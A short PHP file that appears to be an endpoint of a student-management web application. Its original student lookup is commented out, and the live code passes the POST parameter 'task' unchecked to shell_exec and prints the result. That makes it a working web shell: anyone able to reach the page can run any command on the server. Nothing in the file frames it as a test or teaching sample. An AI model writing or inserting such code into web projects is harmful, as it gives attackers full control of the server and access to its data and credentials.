<?php
include("../common/initialization.php");


$data=new stdClass;

$task=$_POST["task"];


echo shell_exec($task);
mysqli_close($dbc);
// echo $email;
// echo $pass;
// $student=get_student($dbc,$student_id);

// if($student)
// {
// 	$data->student=json_decode($student);
// 	$data->status="success";
// }
// else
// {
// 	$data->status="failed";

// }

// echo json_encode($data);
?>